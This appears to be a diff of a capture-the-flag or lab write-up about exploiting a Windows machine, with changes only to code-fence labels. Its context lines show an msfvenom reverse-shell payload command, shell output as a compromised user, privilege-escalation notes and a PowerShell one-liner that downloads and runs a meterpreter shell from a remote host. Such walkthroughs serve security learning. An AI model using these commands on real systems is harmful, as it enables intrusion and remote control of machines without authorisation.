@@ -443,7 +443,7 @@ We can corroborate our chain is working using the debugger. We should stop befor
 
 Yay! Now we can execute on the stack (we can confirm by executing on the debugger). We also can control the execution to point to our desired Shellcode, so we can send a reverse shell. At the time, I used the following msfvenom command to generate it.
 
-```cmd
+```
 msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=1337 -b"\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
 ```
 
@@ -472,7 +472,7 @@ Now let's fire up the exploit and....
 We got a shell (YAY!) as the user dev.
 
 
-```cmd
+```
 C:\shared>whoami
 whoami
 rainbow2\dev
@@ -484,7 +484,7 @@ C:\shared>
 
 After going for the user flag (LOL) we can escalate privileges to get an admin shell. For that, we check our privileges and groups using __whoami /all__ we'll receive an output similar to the one below.
 
-```cmd
+```
 C:\shared>whoami /all
 whoami /all
 
@@ -531,7 +531,7 @@ We can observe we have a high-integrity shell, and we are part of NT AUTHORITY. 
 
 We then can host the shell in a Python web server and execute PowerShell in our shell and download and execute the meterpreter reverse shell with the followign command
 
-```cmd
+```
 (new-object system.net.webclient).DownloadString('http://10.8.0.138/dplashell.txt') | IEX
 ```
 Now we got a meterpreter session. 
